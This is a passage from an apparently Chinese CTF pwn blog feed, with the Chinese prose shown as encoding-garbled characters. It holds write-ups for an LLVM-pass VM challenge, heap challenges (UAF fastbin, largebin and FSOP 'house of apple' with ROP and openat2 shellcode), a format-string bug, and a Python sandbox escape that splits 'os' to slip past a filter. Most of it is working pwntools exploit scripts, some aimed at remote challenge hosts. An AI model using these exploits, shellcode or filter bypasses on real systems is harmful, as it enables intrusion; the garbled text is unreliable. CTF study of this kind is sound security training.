<p>å¯ä»¥çœ‹å‡ºæ˜¯op1-8çš„æŒ‡ä»¤ï¼Œå‰é¢ä½¿ç”¨äº†<code>isValidOp</code>å‡½æ•°æ¥åˆ¤æ–­<br>
è¿›å…¥åå‘ç°è¯¥å‡½æ•°å†…éƒ¨ä¹Ÿæ˜¯é€šè¿‡<code>getName</code>è¯»å–å‡½æ•°å<code>operator==</code>æ¯”è¾ƒå‡½æ•°åæ¥å®ç°çš„ï¼Œæ‰€ä»¥å¯ä»¥ç”¨ç›¸åŒæ–¹æ³•æ‰¾å‡ºop1-8æ‰€ç”¨åˆ°çš„å‡½æ•°å<br>
è¿™é‡Œä»¥op1ä¸ºä¾‹<br>
<img src="https://l1u66.github.io//post-images/1733844522717.png" alt="" loading="lazy"><br>
å‘ç°éœ€è¦è¢«ä¿®é¥°ä¸º<code>_ZN4edoc4addiEhii</code>(å…·ä½“è§£é‡Šè§C++å‡½æ•°åä¿®é¥°è§„åˆ™)ï¼Œå¯ä»¥æ¨æ–­å‡ºè¯¥å‡½æ•°æ˜¯ä½äºedocç±»ä¸‹çš„addiå‡½æ•°ï¼Œå‚æ•°ç±»å‹æ˜¯unsigned charã€intã€intï¼Œæ›¿ä»–opåŒç†å¾—åˆ°äº¤äº’ä»£ç </p>
<pre><code>class edoc {
public:
    void addi(unsigned char x, int y, int z) {}  
    void chgr(unsigned char x, int y) {}                  
    void sftr(unsigned char x, bool y, unsigned char z) {}       
    void borr(unsigned char x, unsigned char y, unsigned char z) {} 
    void movr(unsigned char x, unsigned char y) {}                 
    void save(unsigned char x, unsigned int  y) {}              
    void load(unsigned char x, unsigned int y) {}              
    void runc(unsigned char x, unsigned int  y) {}                
};

edoc obj;

int c0deVmMain() {
        return 0;
}
</code></pre>
<h1 id="é€†å‘å„ä¸ªopcode">é€†å‘å„ä¸ªopcode</h1>
<p>ä»¥op1ä¸ºä¾‹<br>
<img src="https://l1u66.github.io//post-images/1733844761080.png" alt="" loading="lazy"><br>
<code>llvm::CallBase::getNumArgOperands(v13)</code>ç”¨äºè·å–å‚æ•°ä¸ªæ•°<br>
<code>ArgOperand = (llvm::Value *)llvm::CallBase::getArgOperand(v13, i);</code>ç±»ä¼¼åˆ›å»ºå‚æ•°å¯¹è±¡<br>
<code>llvm::ConstantInt::getZExtValue(v8);</code>è·å–å‚æ•°çš„å€¼<br>
<code>*(_QWORD *)std::vector&lt;unsigned long&gt;::operator[](&amp;secret::regs, ZExtValue) = v6;</code>ç›¸å½“äºregs[ZExtValue]=v6</p>
<h2 id="å‚æ•°ä½ç½®">å‚æ•°ä½ç½®</h2>
<p>ä¸»è¦å…³æ³¨<code>getZExtValue</code>å’Œ<code>getBoolValue</code>ä¹‹ç±»è·å–å‚æ•°çš„å‡½æ•°<br>
è¿˜åŸå„ä¸ªopåŠŸèƒ½å¦‚ä¸‹</p>
<pre><code class="language-c++">class edoc {
    public:
        void addi(unsigned char reg, int op1, int op2);
        // op1 + op2 -&gt; regs[reg]
        void chgr(unsigned char reg, int op);
        // regs[reg] + op -&gt; regs[reg] if |op| &lt; 0x1000 and only once
        void sftr(unsigned char reg, bool is_left, unsigned char bits);
        // regs[reg] &lt;&lt; bits if is_left else regs[reg] &gt;&gt; bits
        void borr(unsigned char reg1, unsigned char reg2, unsigned char reg3);
        // regs[reg2] | regs[reg3] -&gt; regs[reg1]
        void movr(unsigned char reg1, unsigned char reg2);
        // regs[reg2] -&gt; regs[reg1]
        void save(unsigned char reg, unsigned offset);
        // regs[reg] -&gt; *(regs[6] + offset)
        void load(unsigned char reg, unsigned offset);
        // *(regs[6] + offset) -&gt; regs[reg]
        void runc(unsigned char reg, unsigned offset);
        // *(regs[6] + offset)(regs[reg])
 }
</code></pre>
<p>exp:</p>
<pre><code class="language-c++">class edoc {
    public:
        void addi(unsigned char reg, int op1, int op2);
        // op1 + op2 -&gt; regs[reg]
        void chgr(unsigned char reg, int op);
        // regs[reg] + op -&gt; regs[reg] if |op| &lt; 0x1000 and only once
        void sftr(unsigned char reg, bool is_left, unsigned char bits);
        // regs[reg] &lt;&lt; bits if is_left else regs[reg] &gt;&gt; bits
        void borr(unsigned char reg1, unsigned char reg2, unsigned char reg3);
        // regs[reg2] | regs[reg3] -&gt; regs[reg1]
        void movr(unsigned char reg1, unsigned char reg2);
        // regs[reg2] -&gt; regs[reg1]
        void save(unsigned char reg, unsigned offset);
        // regs[reg] -&gt; *(regs[6] + offset)
        void load(unsigned char reg, unsigned offset);
        // *(regs[6] + offset) -&gt; regs[reg]
        void runc(unsigned char reg, unsigned offset);
        // *(regs[6] + offset)(regs[reg])
 };

edoc obj;

void testfunction(){}

int c0deVmMain() {
        obj.addi(0, 0x442000, 0);
        obj.movr(6, 0);
        obj.addi(1, 0x443000, 0);		
        obj.movr(7, 1);					//regs[7] = regs[6] + 0x1000
        obj.load(2, 0xad8);    			//load(0x4420xad8): regs[2] = getenv_addr

        obj.sftr(2, 0, 16);                     
        obj.sftr(2, 1, 12);
        obj.addi(5, 0x400, 0);
        obj.borr(2, 2, 5);
        obj.chgr(2, 0xc00);
        obj.sftr(2, 1, 4);				//Sets the lower two bytes to null and increments the third last byte by 1
        obj.addi(4, 0xd70, 0);
        obj.borr(2, 2, 4);				//clear and add
    
        obj.addi(4, 0x3024, 0);
        obj.save(4, 0x1000);			//save $0

        obj.save(2, 0xb00);				//save system

        obj.runc(1, 0xb00);				//system('$0')
        return 0;
}
</code></pre>
<p>çˆ†ç ´è„šæœ¬</p>
<pre><code class="language-python">from pwn import *
import base64

context(arch='amd64', os='linux', log_level='debug')

li = lambda x : print('\x1b[01;38;5;214m' + str(x) + '\x1b[0m')
ll = lambda x : print('\x1b[01;38;5;1m' + str(x) + '\x1b[0m')

context.terminal = ['tmux','splitw','-h']

with open(&quot;exp.ll&quot;, &quot;rb&quot;) as file:
    p = base64.b64encode(file.read())
p += b'\nEOF\n'

rnd = 0
while True:
    try:
        r = remote('127.0.0.1', 7090)
        rnd += 1
        li('the ' + str(rnd) + ' round')
        r.recvuntil(b'(EOF to stop):\n')

        r.send(p)

        r.sendline('cat flag')
        for i in range(4):
            s = r.recvline()
        if b'flag' in s:
            li(s)
            break
        else:
            continue

    except EOFError:
        r.close()
        continue
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[åŸºäºxinetdçš„pwné¢˜ç›®éƒ¨ç½²]]></title>
        <id>https://l1u66.github.io/post/ji-yu-xinetd-de-pwn-ti-mu-bu-shu/</id>
        <link href="https://l1u66.github.io/post/ji-yu-xinetd-de-pwn-ti-mu-bu-shu/">
        </link>
        <updated>2024-12-10T10:18:51.000Z</updated>
        <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/Myon5/article/details/131763593">https://blog.csdn.net/Myon5/article/details/131763593</a><br>
1.ä¿®æ”¹ctf.xinetdå’ŒDockerfileçš„portä¸º80<br>
2.æ­å»ºé•œåƒ<code>docker build -t &quot;é•œåƒå&quot; .</code><br>
3.è¿è¡Œé•œåƒ<code>docker run -d -p &quot;0.0.0.0:8090:80&quot; -h &quot;é•œåƒå&quot; --name=&quot;é•œåƒå&quot; é•œåƒå</code><br>
4.ç›´æ¥<code>nc 127.0.0.1 8090</code>å³å¯è¿æ¥æˆåŠŸ<br>
<code>docker cp flag å®¹å™¨ID:/home/ctf</code>å¯æ›¿æ¢flag</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[èœ€é“å±±]]></title>
        <id>https://l1u66.github.io/post/shu-dao-shan/</id>
        <link href="https://l1u66.github.io/post/shu-dao-shan/">
        </link>
        <updated>2024-11-18T10:20:55.000Z</updated>
        <content type="html"><![CDATA[<h1 id="ç¬¬ä¸€é“">ç¬¬ä¸€é“</h1>
<p><img src="https://l1u66.github.io//post-images/1731925415445.png" alt="" loading="lazy"><br>
å‘ç°åªè¦çŸ¥é“libcåœ°å€ç„¶åå†é¢„æµ‹ä¸€ä¸‹ä¼ªéšæœºæ•°å³å¯æ‹¿åˆ°sellï¼Œquestion_liståœ¨bssæ®µä¸Šï¼Œæ•°ç»„ä¸‹è¡¨æº¢å‡ºå³å¯æ”¹å†™stdoutç»“æ„ä½“ï¼Œæ³„éœ²å‡ºæ¥libcåœ°å€ï¼Œç„¶åå†éšä¾¿é¢„æµ‹ä¸€ä¸‹ä¼ªéšæœºæ•°</p>
<pre><code>from pwn import *
from LibcSearcher import *
import ctypes
context(os=&quot;linux&quot;, arch=&quot;amd64&quot;, log_level=&quot;debug&quot;)
# åŠ è½½åŠ¨æ€é“¾æ¥åº“
lib = ctypes.CDLL('./1.so')
lib.random_number.restype = ctypes.c_int
# è°ƒç”¨Cè¯­è¨€çš„set_seedå‡½æ•°
lib.set_seed()
# è°ƒç”¨Cè¯­è¨€çš„random_numberå‡½æ•°
result = lib.random_number()
rand = result % 9011
print(rand)

#p = process(&quot;./pwn&quot;)
p = remote('gamebox.yunyansec.com',25683)

p.sendlineafter(&quot;Which question do you want to answer?\n&quot;,b'-8')

payload = p64(0xfbad1800) + p64(0)*3 + b'\x00'
p.sendlineafter(&quot;Then you can input your answer.&quot;,payload)
p.recv(1)
p.recv(8)
libc = u64(p.recv(8)) - 2017664
print(&quot;libc = &quot;,hex(libc))
puts = libc + 0x000000000084420
pause()
p.sendlineafter(&quot;Which question do you want to answer?&quot;,b'2')
p.sendlineafter(&quot;Then you can input your answer.&quot;,b'2')
p.sendlineafter(&quot;Which question do you want to answer?&quot;,b'3')
p.sendlineafter(&quot;Then you can input your answer.&quot;,p64(puts + rand))
p.interactive()
</code></pre>
<h1 id="ç¬¬äºŒé“noleak">ç¬¬äºŒé“(noleak??)</h1>
<p>2.23çš„libc,ç»™äº†åé—¨å‡½æ•°ï¼Œç¨‹åºå¼€å¤´ç»™äº†å †åœ°å€ï¼Œåªæœ‰addå’ŒdeleteåŠŸèƒ½ä½†æ˜¯åŸºæœ¬æ²¡æœ‰é™åˆ¶ï¼Œå­˜åœ¨uafï¼Œç‰ˆæœ¬å¾ˆä½ï¼Œç›´æ¥æ‰“fast attackå³å¯ï¼Œä½†æ˜¯æ²¡æœ‰showåŠŸèƒ½ï¼Œæ‰€ä»¥éœ€è¦åŠ«æŒstdoutç»“æ„ä½“ï¼Œè¦è®©libcçš„åœ°å€å‡ºç°åœ¨fast binä¸­ï¼Œå…·ä½“åšæ³•æ˜¯å…ˆåˆ›å»ºä¸€ä¸ªå¤§çš„unsorted binï¼Œç„¶åé€šè¿‡uafå®ç°å †è¦†ç›–ï¼Œå¤§æ¦‚å¸ƒç½®æˆè¿™ä¸ªæ ·å­<br>
<img src="https://l1u66.github.io//post-images/1731926053038.png" alt="" loading="lazy"><br>
ç„¶ååˆ†é…unsortedbinå°±å¯ä»¥ï¼Œå†ä¿®æ”¹ä½ä½è¦†ç›–å³å¯</p>
<pre><code>from pwn import *
context(arch='amd64', os='linux', log_level='debug')
r = process('./vuln')
e = ELF('./vuln')
libc = ELF('./libc.so.6')  # ubuntu22æ‰“æœ¬åœ°

one = [0xe6aee, 0xe6af1, 0xe6af4]


def dbg():
    gdb.attach(r)


def cmd(choice):
    r.recvuntil(b'&gt;&gt;&gt; ')
    r.sendline(str(choice).encode())


def add(idx,size,content):
    cmd(1)
    r.recvuntil(b'idx???')
    r.sendline(str(idx).encode())
    r.recvuntil(b'size???')
    r.sendline(str(size).encode())
    r.recvuntil(b'content???')
    r.send(content)


def delete(idx):
    cmd(2)
    r.recvuntil(b'idx???')
    r.sendline(str(idx).encode())

r.recvuntil(&quot;0x&quot;)
heap = int(r.recv(7),16)
print(&quot;heap = &quot;,hex(heap))
add(0,0x500,b'a')
add(1,0x20,b'a')
delete(0)
add(2,0x48,b'\x78')
add(3,0x48,(p64(0) + p64(0x51))*4)
add(4,0x78,b'\x78')
add(5,0x68,b'\x78')
add(10,0x48,b'\x78')
delete(2)
delete(3)
delete(2)
fake_heap = heap - 134992
add(6,0x48,p64(fake_heap))
add(7,0x48,b'a')
add(8,0x48,b'a')
add(9,0x48,p64(0) + p64(0xf1))
delete(4)
delete(5)
add(11,0x78,(p64(0) + p64(0x41))*7)
add(12,0x58,b'a')

add(4,0x38,b'\x78')
add(5,0x38,b'\x78')
add(10,0x38,b'\x78')
delete(4)
delete(5)
delete(4)
fake_heap = heap - 134864
add(6,0x38,p64(fake_heap))
add(99,0x38,b'a')
add(99,0x38,b'a')
add(9,0x38,p64(0) + p64(0x71) + b'\xdd\x55')
add(9,0x38,p64(0) + p64(0x71) + b'\xdd\x55')
add(5,0x68,b'\x78')
add(12,0x68,b'\x00'*51 + p64(0xfbad1800) + p64(0)*3 + b'\x40')
libc = u64(r.recv(8)) - 3954240
print(&quot;libc = &quot;,hex(libc))
malloc_hook = libc + 3951376

add(4,0x68,b'\x78')
add(5,0x68,b'\x78')
add(10,0x68,b'\x78')
delete(4)
delete(5)
delete(4)
add(6,0x68,p64(malloc_hook - 35))
add(99,0x68,b'a')
add(99,0x68,b'a')
#gdb.attach(r)
backdoor = 0x000000000400AAA
add(9,0x68,b'a'*19 + p64(backdoor))
cmd(1)
r.recvuntil(b'idx???')
r.sendline(str(0).encode())
r.recvuntil(b'size???')
r.sendline(str(0x100).encode())
r.interactive()
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[å¼ºç½‘æ¯]]></title>
        <id>https://l1u66.github.io/post/qiang-wang-bei/</id>
        <link href="https://l1u66.github.io/post/qiang-wang-bei/">
        </link>
        <updated>2024-11-03T09:14:46.000Z</updated>
        <content type="html"><![CDATA[<h1 id="baby_heap">baby_heap</h1>
<p>ç¨‹åºæ˜¯2.35çš„libcï¼Œå¢åˆ æ”¹æŸ¥åŠŸèƒ½éƒ½æœ‰ï¼Œä½†æ˜¯åªèƒ½editä¸€æ¬¡<br>
<img src="https://l1u66.github.io//post-images/1730625989781.png" alt="" loading="lazy"><br>
åªèƒ½showä¸€æ¬¡<br>
<img src="https://l1u66.github.io//post-images/1730626006840.png" alt="" loading="lazy"><br>
åªèƒ½add6ä¸ªå †å—ï¼Œå¤§å°åœ¨0x500ä»¥ä¸Šï¼Œä¸‹æ ‡ä»1å¼€å§‹ï¼Œ<br>
<img src="https://l1u66.github.io//post-images/1730625869786.png" alt="" loading="lazy"><br>
æœ‰UAFï¼Œfreeåä¹Ÿèƒ½editå’Œshow<br>
<img src="https://l1u66.github.io//post-images/1730625970233.png" alt="" loading="lazy"><br>
ç¬¬äº”ä¸ªé€‰é¡¹æ²¡å•¥ç”¨<br>
<img src="https://l1u66.github.io//post-images/1730627002423.png" alt="" loading="lazy"><br>
ç¨‹åºè¿˜ç»™äº†ä¸€ä¸ªç±»ä¼¼äºåé—¨çš„é€‰é¡¹<br>
<img src="https://l1u66.github.io//post-images/1730625650896.png" alt="" loading="lazy"><br>
ä½†æ˜¯æœ‰ä¸ªæ£€æŸ¥<img src="https://l1u66.github.io//post-images/1730625694248.png" alt="" loading="lazy"><br>
åŠ¨è°ƒçœ‹äº†ä¸‹èŒƒå›´ï¼Œå‘ç°èƒ½å†™çš„åœ°å€èŒƒå›´æ²¡å•¥æœ‰ç”¨çš„<br>
è¿˜å¼€äº†æ²™ç›’<br>
<img src="https://l1u66.github.io//post-images/1730626306949.png" alt="" loading="lazy"></p>
<h2 id="æ”»å‡»æ€è·¯">æ”»å‡»æ€è·¯</h2>
<p>2.35çš„libcæ²¡æœ‰äº†å„ç§hookï¼Œæ‰€ä»¥éœ€è¦æ‰“ioï¼Œç¨‹åºæ˜“é€šè¿‡exitå‡½æ•°é€€å‡ºï¼Œæ˜“è§¦å‘FSOPï¼Œé¦–å…ˆé€‰æ‹©æ‰“house of appleï¼Œæœ‰editå°±å¯ä»¥æ‰“largebin attackäº†ï¼Œéœ€è¦add5ä¸ªå †å—ï¼Œä¸­é—´å¯ä»¥showä¸€ä¸ªlargebiné‡Œçš„å †å—æ³„éœ²å‡ºlibcå’Œheapåœ°å€ï¼ŒåŠ«æŒ_IO_list_allï¼Œä½†æ˜¯æ­¤æ—¶_IO_list_allé‡Œçš„ä¼ªé€ çš„ioæ˜¯ç¬¬äºŒæ¬¡è¿›å…¥largebinçš„å †å—ï¼Œè€Œåªæœ‰ä¸€æ¬¡editæœºä¼šå·²ç»ç”¨åœ¨äº†largebin attackä¸Šï¼Œæ­¤æ—¶è¿˜æœ‰ä¸€æ¬¡addçš„æœºä¼šï¼ŒæŠŠæ­¤å †å—ç”³è¯·å‡ºæ¥å°±å¯ä»¥ä½¿_IO_list_allé‡Œçš„ä¼ªé€ çš„ioæŒ‡å‘ç¬¬ä¸€æ¬¡è¿›å…¥largebinçš„å †å—ï¼Œå°±å¯ä»¥è¢«æˆ‘ä»¬æ§åˆ¶ï¼Œä¼ªé€ ioæ—¶å‘ç°_IO_wfile_jumpsè¢«ç½®0äº†ï¼Œæ‰€ä»¥ç”¨_IO_wfile_jumps_mmapæ¥è°ƒç”¨_IO_wfile_overflowï¼Œç¨‹åºå¼€äº†æ²™ç›’ï¼Œç¦ç”¨äº†openå’Œopenatï¼Œä½¿ç”¨openat2ç»•è¿‡å³å¯ï¼Œä¸èƒ½ç›´æ¥æ‹¿åˆ°shellï¼Œæ‰€ä»¥ä¼ªé€ ioä½¿ç”¨svcudp_replyçš„gadgetsè°ƒç”¨mprotectä½¿å †åœ°å€å¯æ‰§è¡Œï¼Œå†™å…¥shellcodeæ‰§è¡Œå³å¯</p>
<pre><code>from pwn import *

context(os='linux',arch='amd64',log_level='debug')
# io = process('./pwn')
io = remote(&quot;59.110.159.153&quot;,35015)
e = ELF('./pwn')
lib = e.libc

def dbg():
    gdb.attach(io)


def cmd(choice):
    io.sendlineafter('Enter your choice: \n',str(choice).encode())

# å¤§å°åœ¨0x500ä»¥ä¸Š
# 6ä¸ª ä»1å¼€å§‹
def add(size):
    cmd(1)
    io.sendlineafter('Enter your commodity size \n',str(size).encode())

def edit(idx,payload):
    cmd(3)
    io.sendlineafter('Enter which to edit: \n',str(idx).encode())
    io.sendlineafter('Input the content \n',payload)

def delete(idx):
    cmd(2)
    io.sendlineafter('Enter which to delete: \n',str(idx).encode())
    
def show(idx):
    cmd(4)
    io.sendlineafter('Enter which to show: \n',str(idx).encode())

# ä»»æ„åœ°å€å†™
def magic(addr,con):
    cmd(6)
    io.sendlineafter('Input your target addr \n',p64(addr))
    io.send(p64(con))


add(0x528)#1
add(0x528)#2
add(0x518)#3
delete(1)
add(0x620)#4
show(1)

io.recvuntil(&quot;The content is here \n&quot;)
libc = u64(io.recv(8)) 
libc_base = libc - 0x21b110
print(&quot;libc_base = &quot;,hex(libc_base))
io.recv(8)
heap = u64(io.recv(8)) 
heap_base = heap - 0x950
print(&quot;heap_base = &quot;,hex(heap_base))

strerr = 0x21b860 + libc_base
fake_io_addr = 2384 + heap_base
lock = libc_base + 0x21ba60
_IO_list_all = libc_base + lib.sym['_IO_list_all']
io_wfile_jumps = libc_base + lib.sym['_IO_wfile_jumps'] - 0xc0
magic_gadget = libc_base + 0x000000000016a06a
add_rsp_ret=libc_base+0x000000000003a889        #0x18
leave_ret = libc_base + 0x000000000004da83
&quot;&quot;&quot;
&lt;svcudp_reply+26&gt;:    mov    rbp,QWORD PTR [rdi+0x48]
&lt;svcudp_reply+30&gt;:    mov    rax,QWORD PTR [rbp+0x18]
&lt;svcudp_reply+34&gt;:    lea    r13,[rbp+0x10]
&lt;svcudp_reply+38&gt;:    mov    DWORD PTR [rbp+0x10],0x0
&lt;svcudp_reply+45&gt;:    mov    rdi,r13
&lt;svcudp_reply+48&gt;:    call   QWORD PTR [rax+0x28]
&quot;&quot;&quot;
pop_rdi = libc_base + 0x000000000002a3e5
pop_rsi = libc_base + 0x000000000002be51
pop_rdx_r12 = libc_base + 0x000000000011f2e7
mprotect = libc_base + 0x00000000011EAA0
# openat2 
sh=f'''
mov rax, 0x67616c66 /*  /flag   */
push rax
xor rdi, rdi
sub rdi, 100
mov rsi, rsp
push 0
push 0
push 0
mov rdx, rsp
mov r10, 0x18
push 437
pop rax
syscall

mov rdi,rax
mov rsi,rsp
push 0x100
pop rdx
xor eax,eax
syscall

xor rdi,rdi
inc rdi
mov rax,rdi
syscall
'''

rop=p64(pop_rdi)
rop+=p64(heap - 0x950)
rop+=p64(pop_rsi)
rop+=p64(0x1000)
rop+=p64(pop_rdx_r12)
rop+=p64(7)
rop+=p64(0)
rop+=p64(mprotect)
rop+=p64(fake_io_addr + 0x370)

fake_io_file = p64(0)*2 + p64(1) + p64(_IO_list_all - 0x20)
fake_io_file = fake_io_file.ljust(
    0x48 - 0x10, b'\0') + p64(fake_io_addr + 0x300) + p64(leave_ret)  # rbp
fake_io_file = fake_io_file.ljust(
    0xa0 - 0x10, b'\0') + p64(fake_io_addr + 0x100)  # _wide_data (A)
fake_io_file = fake_io_file.ljust(
    0xc0 - 0x10, b'\0') + p64(0xffffffffffffffff)  # _mode
fake_io_file = fake_io_file.ljust(
    0xd8 - 0x10, b'\0') + p64(io_wfile_jumps)  # vtable
fake_io_file = fake_io_file.ljust(
    0x100 - 0x10 + 0xe0, b'\0') + p64(fake_io_addr + 0x200)  # B
fake_io_file = fake_io_file.ljust(
    0x200 - 0x10, b'\0') + p64(0)*13 + p64(magic_gadget)  # C
fake_io_file = fake_io_file.ljust(
    0x300 - 0x10, b'\0') + p64(0) + p64(add_rsp_ret)
fake_io_file = fake_io_file.ljust(
    0x318 - 0x10, b'\0') + p64(fake_io_addr + 0x28) + p64(0) + rop  # rax
fake_io_file += asm(sh)

edit(1,fake_io_file)
delete(3)
add(0x620)#5
add(0x518)#6
print(&quot;_IO_list_all = &quot;,hex(_IO_list_all))
print(&quot;fake_io_addr = &quot;,hex(fake_io_addr))
print(sh)
# gdb.attach(io)
cmd(4)

io.interactive()
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[æºé²æ¯2024]]></title>
        <id>https://l1u66.github.io/post/yuan-lu-bei-2024/</id>
        <link href="https://l1u66.github.io/post/yuan-lu-bei-2024/">
        </link>
        <updated>2024-10-25T16:04:33.000Z</updated>
        <content type="html"><![CDATA[<p>æµ…æµ…æ‹¿ä¸ªäºŒç­‰å¥–ğŸ˜‹<br>
<img src="https://l1u66.github.io//post-images/1729873236149.png" alt="" loading="lazy"></p>
<h1 id="round-1">Round 1</h1>
<h2 id="round-1-canary_orw">[Round 1] canary_orw</h2>
<p>idaæ‰“å¼€ç¨‹åºå‘ç°æœ‰ä¸ªhintå‡½æ•°ï¼Œé‡Œé¢æœ‰ä¸ªæ±‡ç¼–jmp rspï¼Œå¹¶ä¸”å‘ç°æ ˆå¯æ‰§è¡Œï¼Œæ‰€ä»¥å¾—çŸ¥æ‰“shellcodeï¼Œå¹¶ä¸”å¼€äº†æ²™ç›’ï¼Œæ²¡æœ‰ä»»ä½•è¿‡æ»¤</p>
<pre><code>from pwn import *
from LibcSearcher import LibcSearcher
context(log_level='debug',arch='amd64',os='linux')

p = process('./canary')
elf = ELF('./canary')

vuln = 0x000000000400820
jmp_rsp = 0x00000000040081B
# xor eax,eax 
# add rdx,0x60
# syscall
payload = p64(jmp_rsp) + b&quot;\x31\xc0\x31\xff\x48\x83\xc2\x60\x0f\x05&quot;
# gdb.attach(p)
p.sendafter(&quot;Say some old spells to start the journey\n&quot;, payload)
shellcode='''
	xor rax, rax   #xor rax,raxæ˜¯å¯¹raxçš„æ¸…é›¶è¿ç®—æ“ä½œ
	xor rdi, rdi   #æ¸…ç©ºrdiå¯„å­˜å™¨çš„å€¼
	xor rsi, rsi   #æ¸…ç©ºrsiå¯„å­˜å™¨çš„å€¼
	xor rdx, rdx
	mov rax, 2      #openè°ƒç”¨å·ä¸º2
	mov rdi, 0x67616c662f2e   #ä¸ºgalf/.ä¸º./flagçš„ç›¸å0x67616c662f2eä¸º/flagçš„ASCIIç çš„åå…­è¿›åˆ¶
	push rdi
	mov rdi, rsp
    xor rsi, rsi
	syscall   #ç³»ç»Ÿè°ƒç”¨å‰ï¼Œlinuxåœ¨eaxå¯„å­˜å™¨é‡Œå†™å…¥å­åŠŸèƒ½å·ï¼Œæ–­æ­¢å¤„ç†ç¨‹åºæ ¹æ®eaxå¯„å­˜å™¨çš„å€¼æ¥åˆ¤æ–­ç”¨æˆ·è¿›ç¨‹ç”³è¯·å“ª	ç±»ç³»ç»Ÿè°ƒç”¨ã€‚
	mov rdx, 0x100   #sys_read(3,file,0x100)
	mov rsi, rdi
	mov rdi, rax
	mov rax, 0      #readè°ƒç”¨å·ä¸º0,0ä¸ºæ–‡ä»¶æè¿°ç¬¦ï¼Œå³å¤–éƒ¨è¾“å…¥ï¼Œä¾‹å¦‚é”®ç›˜
	syscall
	mov rdi, 1      #sys_write(1,file,0x30)
	mov rax, 1      #writeè°ƒç”¨å·ä¸º1,1ä¸ºæ–‡ä»¶æè¿°ç¬¦ï¼ŒæŒ‡çš„æ˜¯å±å¹•
	syscall
'''
shellcode = asm(shellcode)
print(shellcode)
pause()
p.send(b'./flag\x00\x00' + shellcode)
p.interactive()
</code></pre>
<h2 id="round-1-ezfmt">[Round 1] ezfmt</h2>
<p>ä¸€æ¬¡æ ˆæº¢å‡ºå¤–åŠ ä¸€æ¬¡æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œé€šè¿‡æ ˆæº¢å‡ºå¯ä»¥è§¦å‘å¤šæ¬¡æ ¼å¼åŒ–å­—ç¬¦ä¸²,æœ¬æ¥æƒ³æ”¹printfçš„gotè¡¨ï¼Œä½†æ˜¯readçš„å­—èŠ‚æ•°è²Œä¼¼ä¸å¤ªå¤Ÿï¼Œæƒ³åˆ°æœ‰one_gadgetsï¼Œç¬¬äºŒä¸ªå³å¯æ‹¿åˆ°shell</p>
<pre><code>from pwn import *
from LibcSearcher import *
context(os=&quot;linux&quot;, arch=&quot;amd64&quot;, log_level=&quot;debug&quot;)

p = process(&quot;./pwn&quot;)
elf = ELF(&quot;./pwn&quot;)

bss = 0x000000000404060 + 0x700
main = 0x00000000040120D
printf = 0x000000000404020

# gdb.attach(p)
payload = b&quot;%13$paaa&quot;
payload = payload.ljust(32,b'a')
payload += p64(bss) + p64(main)
p.sendafter(&quot;welcome to YLCTF\n&quot;,payload)

p.recvuntil(&quot;0x&quot;)
__libc_start_main = int(p.recv(12),16) - 243
print(&quot;__libc_start_main = &quot;,hex(__libc_start_main))
base = __libc_start_main - 147344
print(&quot;base = &quot;,hex(base))
sys = base + 0x000000000052290
print(&quot;sys = &quot;,hex(sys))
one = [0xe3afe, 0xe3b01, 0xe3b04]

x1 = sys &amp; 0xffff
payload = b'%' + str(x1).encode(&quot;utf-8&quot;) + b'c' + b'%7$hn'
x2 = (sys &gt;&gt; 8) &amp; 0xff
payload += b'%' + str(0x100 + x2 - x1).encode(&quot;utf-8&quot;) + b'c' + b'%8$hhn'
payload = payload.ljust(0x20,b'\x00')
payload += p64(printf) + p64(printf + 4)
pause()
p.sendline(b'a'*32 + p64(0) + p64(base + one[1]))

p.interactive()
</code></pre>
<h2 id="round-1-ezheap">[Round 1] ezheap</h2>
<h3 id="éé¢„æœŸ">éé¢„æœŸ</h3>
<p>è¿™é¢˜ä¹Ÿæ˜¯æŠ½è±¡ï¼Œç”¨ç½‘ç«™å»æ¥å—è„šæœ¬æœ¬åœ°è¿è¡Œå‡ºç»“æœï¼Œè¿˜å†™æ˜äº†&lt;è¯·å‹¿å¸¦æœ‰oså’Œsubprocess&gt;ï¼Œç»è¿‡print(1)æµ‹è¯•åå‘ç°ç›´æ¥å›æ˜¾ï¼Œå°±æƒ³åˆ°pythonæ²™ç®±é€ƒé€¸ï¼Œæ‹·æ‰“gptå¾—åˆ°<br>
<img src="https://l1u66.github.io//post-images/1729872506628.png" alt="" loading="lazy"></p>
<p>æµ‹è¯•åä¸è¡Œï¼Œè§‰å¾—åº”è¯¥æ˜¯å§oså­—ç¬¦è¿‡æ»¤æ‰äº†ï¼Œç›´æ¥ç©ºå­—ç¬¦ç»•è¿‡</p>
<pre><code>sys = __import__('o''s')
sys.system('cat flag')
</code></pre>
<p>ç›´æ¥æ‹¿åˆ°flagäº†......</p>
<h3 id="é¢„æœŸè§£">é¢„æœŸè§£</h3>
<p>è¯¥ç¨‹åºæœ‰ä¸€æ¬¡ä»»æ„åœ°å€å†™ä¸€å¤§æ•°çš„æœºä¼šï¼Œå¯ä»¥è¦†ç›–mpæ‰©å¤§tcachebinçš„èŒƒå›´ï¼Œè¿™ä¸ªæŒ‡é’ˆä¼šä¼šæŒ‰ç…§åœ°å€é¡ºå»¶åˆ°é«˜åœ°å€å¤„çš„chunkï¼Œä¼šè¢«æˆ‘ä»¬æ§åˆ¶ï¼Œä»è€Œè®©æˆ‘ä»¬æ‹¥æœ‰ä»»æ„åœ°å€å†™çš„èƒ½åŠ›ï¼Œä»è€Œè·å–shellã€‚</p>
<h4 id="å¯»æ‰¾mp_">å¯»æ‰¾mp_</h4>
<p><code>p mp_</code>æ‰“å°å‡ºmp_ç»“æ„ä½“ï¼Œè¦†ç›–åç§»0x50çš„tcache_binså³å¯</p>
<pre><code>
from pwn import*
from ctypes import *
from struct import *

io = process(&quot;./pwn&quot;)
context(log_level='debug',arch='amd64',os='linux')

libc = ELF(&quot;./libc-2.31.so&quot;)

elf = ELF(&quot;./pwn&quot;)
menu=&quot;Input your choice&quot;
def add(size,cont):
    io.sendlineafter(menu,str(1))
    io.sendlineafter(&quot;Size :&quot;,str(size))
    io.sendafter(&quot;Content :&quot;,cont)

def delete(idx):
    io.sendlineafter(menu,str(2))
    io.sendlineafter(&quot;Index :&quot;,str(idx))

def edit(addr):
    io.sendlineafter(menu,str(3))
    io.sendafter(&quot;content :&quot;,addr)

def show(idx):
    io.sendlineafter(menu,str(4))
